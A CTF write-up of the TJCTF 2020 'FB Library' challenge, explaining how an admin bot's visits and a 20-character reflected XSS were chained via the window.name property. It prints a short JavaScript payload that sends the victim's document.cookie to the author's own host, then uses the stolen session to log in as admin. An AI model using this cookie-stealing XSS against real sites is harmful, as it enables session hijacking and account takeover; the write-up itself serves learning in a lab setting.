---
title: TJCTF 2020 FB Library Writeup
category: cyber-security
---

I want to make a writeup for this one because it was one of my favourites and I can't find a writeup for it yet on [CTFTime](https://ctftime.org/event/928/tasks/).

Here was the description:

![problem description](/assets/images/fb_library.png)

The [linked website](https://fb_library.tjctf.org/) had a login and registration system that then allowed you to view a catalog of books and then report them to the admin. When you reported, you would go to `/report?url=<book url>` with a success message. We realized we could make it `report` any valid url and it would then open a get request to that url

So for example, when I reported my website [http://uzpg.me](http://uzpg.me), I noticed a new GET request with a User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/80.0.3987.0 Safari/537.36`. The most important part here is the **HeadlessChrome** part which is a [Headless Browser](https://en.wikipedia.org/wiki/Headless_browser). A headless browser is an automated way of using a browser without human action.

This meant that we could try and access the cookies and data of this headless browser instance to compromise the `fb_library`. Indeed, the login system we noticed above had a `session` cookie that would log you in. This meant that if we could steal the value of that cookie, we would have admin access.

At first, I tried to report a url that had a `script` that sent me its cookies. Unfortunately, they were empty, because of [Same-Origin Policy](https://en.wikipedia.org/wiki/Same-origin_policy) which prevents a malicious website of accessing cookies of another different domain like the `fb_library` one. 

This meant, the only way I could execute my cookie stealer would be by embedding the payload on the `fb_library` domain. This meant finding another XSS on the website itself. We noticed Reflected XSS in the search bar that allowed you to look for books. But the length of the field was struncated AFTER 20 characters!!! 

Building a cookie stealer in 20 characters would be impossible, so we had to find another way. Some [funny posts](https://jlajara.gitlab.io/posts/2019/11/30/XSS_20_characters.html) had the idea of buying a short domain, but the admins told us no purchase was required. 

My teammate [Techno-Disaster](http://technodisaster.me) 	scoured the web and found the very interesting `window.name` [property](https://developer.mozilla.org/en-US/docs/Web/API/Window/name). This allows you to store a string across different websites. So for example, I can set its value on my own, and then if I redirect to their website, its value will stay the same. Do you see where I am going? :)

So our trick was to make it go to our website and then have a script that would change the `window.name` property to our payload, and then redirect it to the vulnerable search page by setting the query parameter to `<script>eval(name)`. This evaluates our payload stored in the `window.name` property and executes our cookie stealing payload.

```js
window.name = "window.location = 'http://uzpg.me/' + document.cookie;";
location = "https://fb_library.tjctf.org/search?q=<script>eval(name)/*"";
```

When executed, this `window.name` payload executed on the `fb_library` domain would redirect to my website + the cookie.

At that point, all I had to do was look at the cookie and then change my `session` cookie to log in as admin, and then I had the flag:

![flag](/assets/images/flag_lib.png)
